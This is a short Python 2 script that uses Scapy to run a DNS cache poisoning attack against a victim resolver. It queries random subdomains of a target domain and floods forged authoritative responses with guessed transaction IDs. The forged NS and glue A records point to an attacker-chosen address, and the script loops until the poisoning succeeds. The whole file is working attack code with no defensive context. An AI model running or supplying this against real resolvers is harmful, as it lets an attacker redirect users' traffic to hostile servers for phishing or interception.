from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sr1, send
import utils
import dns
import dns.resolver
from argparse import Namespace

def loud(args):
    poisoned = False

    reqPkt = IP(dst=args.victim) / UDP(sport=53) / DNS(qr=0, qd=DNSQR(qname=""))
    resPkt = IP(dst=args.victim) / UDP(sport=54) / DNS(aa=1, qr=1, qd=DNSQR(qname=""), ns=DNSRR(rrname=args.targetDomain,  type='NS', ttl=args.ttl, rdata=args.soaDomain[0]), ar=DNSRR(rrname=args.soaDomain[0], type='A', ttl=args.ttl, rdata=args.addressToForge))

    while not poisoned:
        # generate random subdomain, i.e. 1234www5678.example.com
        queryDomain = utils.getRandomSubdomain() + args.targetDomain
        # send the query with the target domain to the victim
        reqPkt[DNS].qd.qname = queryDomain
        send(reqPkt,verbose=False)

        resPkt[DNS].qd.qname = queryDomain
        for _ in xrange(60): # stream of 30 forged packets (TODO: test if the amount is right)
            resPkt[DNS].id = utils.getRandomTXID()
            send(resPkt,verbose=False)

        pkt1 = sr1(IP(dst=args.victim) / UDP(sport=53) / DNS(qr=0, qd=DNSQR(qname=str(args.soaDomain)[2:-2])),verbose=False)
        if pkt1[DNS].an and pkt1[DNS].an.rdata:
            actualAnswer = str(pkt1[DNS].an.rdata)
            if actualAnswer == args.addressToForge:
                poisoned = True
    print 'poisoned now!'
